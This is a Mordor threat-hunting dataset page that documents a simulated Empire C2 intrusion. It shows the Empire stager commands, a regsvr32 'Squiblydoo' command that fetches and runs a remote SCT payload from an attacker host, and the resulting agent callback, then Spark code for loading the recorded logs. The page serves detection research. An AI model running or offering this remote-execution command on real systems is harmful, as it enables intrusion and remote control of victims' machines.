# Empire Launcher SCT Regsvr32

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-200721232741 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2020/07/21 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/BC-SECURITY/Empire/blob/master/lib/stagers/windows/launcher_sct.py |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_launcher_sct_regsvr32.zip |

## Dataset Description
This dataset represents threat actors leveraging regsvr32 to proxy the execution of an empire payload (.sct file) to create a reverse connection to the C2.

## Adversary View
```
Threat Actor View:
(Empire) > usestager windows/launcher_sct
(Empire: stager/windows/launcher_sct) > info

Name: regsvr32

Description:
  Generates an sct file (COM Scriptlet) Host this
  anywhere

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  Language         True        powershell        Language of the stager to generate.
  StagerRetries    False       0                 Times for the stager to retry
                                                connecting.
  Base64           True        True              Switch. Base64 encode the output.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                powershell code, uses the
                                                ObfuscateCommand for obfuscation types.
                                                For powershell only.
  ObfuscateCommand False       Token\All\1       The Invoke-Obfuscation command to use.
                                                Only used if Obfuscate switch is True.
                                                For powershell only.
  OutFile          False       /tmp/launcher.sct File to output SCT to, otherwise
                                                displayed on the screen.
  UserAgent        False       default           User-agent string to use for the staging
                                                request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, none,
                                                or other).
  ProxyCreds       False       default           Proxy credentials
                                                ([domain\]username:password) to use for
                                                request (default, none, or other).


(Empire: stager/windows/launcher_sct) > set Listener http
(Empire: stager/windows/launcher_sct) > execute

[*] Stager output written out to: /tmp/launcher.sct

Victim's PC

PS C:\Windows\System32> .\regsvr32.exe /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll

Threat Actor View:

(Empire: stager/windows/launcher_sct) > back
(Empire) > 
Empire: agents) > 
[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent 712ETU3B checked in
[+] Initial agent 712ETU3B from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to 712ETU3B at 172.18.39.5

(Empire: agents) > 
(Empire: agents) > 
(Empire: agents) > agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
712ETU3B ps 172.18.39.5     WORKSTATION5      *MORDOR\pgustavo        powershell         9076   5/0.0    2020-07-22 03:29:27  http            

(Empire: agents) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/empire_launcher_sct_regsvr32.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        